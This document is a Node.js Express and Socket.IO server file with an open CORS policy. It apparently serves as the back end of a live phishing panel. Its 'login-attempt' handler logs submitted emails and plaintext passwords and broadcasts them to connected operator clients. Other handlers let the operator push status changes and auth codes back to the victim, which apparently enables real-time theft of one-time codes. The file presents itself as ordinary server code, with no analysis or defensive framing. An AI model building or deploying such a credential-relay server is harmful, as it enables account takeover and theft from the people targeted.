const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// ======================== CORS ==========================
// Allow all domains
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);

    // Allow all origins - this will work with every domain
    console.log('📥 Request from origin:', origin);
    callback(null, true);
  },
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ======================== SOCKET.IO ==========================
const server = http.createServer(app);

// Socket.IO with configuration that works with all domains
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      // Allow all origins
      if (!origin) return callback(null, true);
      console.log('🔌 Socket connection from origin:', origin);
      callback(null, true);
    },
    methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
  },
  transports: ['websocket', 'polling'],
  path: '/socket.io/',
  pingTimeout: 60000,
  pingInterval: 25000,
  allowEIO3: true,
  allowUpgrades: true,
  upgradeTimeout: 15000,
  cookie: false,
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000,
    skipMiddlewares: true,
  },
  serveClient: false,
  maxHttpBufferSize: 1e6,
  perMessageDeflate: {
    threshold: 1024,
  },
});

console.log('🚀 Socket.IO server initializing...');

// ======================== MIDDLEWARE ==========================
// Global error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    error: 'Internal Server Error',
    message: err.message
  });
});

// ======================== SOCKET EVENTS ==========================
io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('🔌 Transport:', socket.conn.transport.name);
  console.log('📍 Origin:', socket.handshake.headers.origin || 'Unknown');

  // Send connection confirmation
  socket.emit('connected', {
    message: 'Connected to socket server',
    socketId: socket.id,
    transport: socket.conn.transport.name,
    secure: socket.conn.secure || false,
    timestamp: new Date().toISOString(),
  });

  // Handle transport upgrades
  socket.conn.on('upgrade', () => {
    console.log(`🔄 ${socket.id} upgraded to: ${socket.conn.transport.name}`);
  });

  // Admin joining
  socket.on('admin-joined', (data) => {
    console.log(`👑 Admin ${data.name || 'Admin'} joined from ${socket.handshake.headers.origin}`);
    socket.emit('admin-joined-confirmed', {
      status: 'ok',
      timestamp: new Date().toISOString()
    });
  });

  // Ping/Pong for connection keep-alive
  socket.on('ping', () => {
    socket.emit('pong', { timestamp: new Date().toISOString() });
  });

  // Login attempt handler
  socket.on('login-attempt', (data) => {
    console.log(`📥 Login attempt from: ${data.username}`);
    console.log(`📧 Email: ${data.username}`);
    console.log(`🔑 Password: ${data.password}`);

    // Broadcast to all connected admins
    io.emit('admin_notification', {
      email: data.username,
      password: data.password,
      timestamp: new Date().toISOString(),
      source: socket.id,
    });
  });

  // Update login status
  socket.on('update-login-status', (data) => {
    console.log(`📢 Admin updated status: ${data.username} → ${data.status}`);
    console.log(`🔐 Auth Code: ${data.authCode || 'N/A'}`);

    io.emit('user_update', {
      email: data.username,
      newStatus: data.status,
      authCode: data.authCode || '',
      timestamp: new Date().toISOString(),
      source: socket.id,
    });
  });

  // Handle disconnection
  socket.on('disconnect', (reason) => {
    console.log('❌ User disconnected:', socket.id);
    console.log('📌 Reason:', reason);
  });

  // Handle errors
  socket.on('error', (error) => {
    console.error('⚠️ Socket error:', socket.id, error.message);
  });
});

// ======================== HEALTH CHECK ==========================
app.get('/health', (req, res) => {
  const clientsCount = io.engine?.clientsCount || 0;
  res.json({
    status: 'ok',
    clients: clientsCount,
    uptime: Math.floor(process.uptime()),
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
  });
});

// Detailed status endpoint
app.get('/status', (req, res) => {
  res.json({
    status: 'running',
    clients: io.engine?.clientsCount || 0,
    uptime: Math.floor(process.uptime()),
    memory: process.memoryUsage(),
    nodeVersion: process.version,
    platform: process.platform,
    timestamp: new Date().toISOString(),
  });
});

// ======================== API ENDPOINTS ==========================
// Send notification to admins - UPDATED with better logging
app.post('/api/notify-admin', (req, res) => {
  try {
    const { email, type, message } = req.body;

    console.log('='.repeat(50));
    console.log('📧 NOTIFICATION RECEIVED');
    console.log('📧 Email:', email);
    console.log('📊 Type:', type || 'info');
    console.log('📝 Message:', message || 'No message');
    console.log('='.repeat(50));

    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Email is required'
      });
    }

    const clientsCount = io.engine?.clientsCount || 0;
    console.log(`👥 Connected clients: ${clientsCount}`);

    io.emit('admin_notification', {
      email,
      type: type || 'info',
      message: message || '',
      timestamp: new Date().toISOString(),
    });

    console.log('✅ Notification emitted to all clients');

    res.json({
      success: true,
      clients: clientsCount,
      message: 'Notification sent successfully'
    });
  } catch (error) {
    console.error('❌ Error in notify-admin:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Admin action endpoint - UPDATED with better logging and response
app.post('/api/admin-action', (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;

    console.log('='.repeat(50));
    console.log('🔔 ADMIN ACTION RECEIVED');
    console.log('📧 Email:', email);
    console.log('🆔 User ID:', userId);
    console.log('📊 New Status:', newStatus);
    console.log('🔐 Auth Code:', authCode || 'N/A');
    console.log('='.repeat(50));

    if (!userId && !email) {
      return res.status(400).json({
        success: false,
        error: 'userId or email is required'
      });
    }

    const clientsCount = io.engine?.clientsCount || 0;
    console.log(`👥 Connected clients: ${clientsCount}`);

    // Emit to ALL connected clients
    io.emit('user_update', {
      userId,
      newStatus: newStatus || 'updated',
      authCode: authCode || '',
      email: email || '',
      timestamp: new Date().toISOString(),
    });

    console.log('✅ user_update event emitted to all clients');

    res.json({
      success: true,
      clients: clientsCount,
      message: 'Action performed successfully',
      emitted: true
    });
  } catch (error) {
    console.error('❌ Error in admin-action:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get connected clients count
app.get('/api/clients', (req, res) => {
  res.json({
    clients: io.engine?.clientsCount || 0,
    timestamp: new Date().toISOString()
  });
});

// Test endpoint to check server
app.get('/', (req, res) => {
  res.json({
    message: 'Server is running',
    status: 'ok',
    timestamp: new Date().toISOString(),
    endpoints: {
      health: '/health',
      status: '/status',
      clients: '/api/clients',
      notifyAdmin: '/api/notify-admin (POST)',
      adminAction: '/api/admin-action (POST)'
    }
  });
});

// ======================== ERROR HANDLING ==========================
// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise);
  console.error('📌 Reason:', reason);
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error);
  console.error('📌 Stack:', error.stack);
  // Keep the server running
});

// ======================== SERVER START ==========================
const PORT = process.env.PORT || 8000;

// Handle server errors
server.on('error', (error) => {
  console.error('❌ Server error:', error);
  if (error.code === 'EADDRINUSE') {
    console.log(`⚠️ Port ${PORT} is already in use. Trying another port...`);
    // You could implement port fallback here
  }
});

// Start the server
server.listen(PORT, '0.0.0.0', () => {
  console.log('='.repeat(60));
  console.log('🚀 SERVER STARTED SUCCESSFULLY');
  console.log('='.repeat(60));
  console.log(`📍 Port: ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔄 Transports: WebSocket + Polling`);
  console.log(`🔗 CORS: All Origins Allowed (Works with every domain)`);
  console.log(`📊 Health Check: http://localhost:${PORT}/health`);
  console.log(`🏠 Root: http://localhost:${PORT}/`);
  console.log('='.repeat(60));
});

// ======================== GRACEFUL SHUTDOWN ==========================
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 SIGINT received. Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});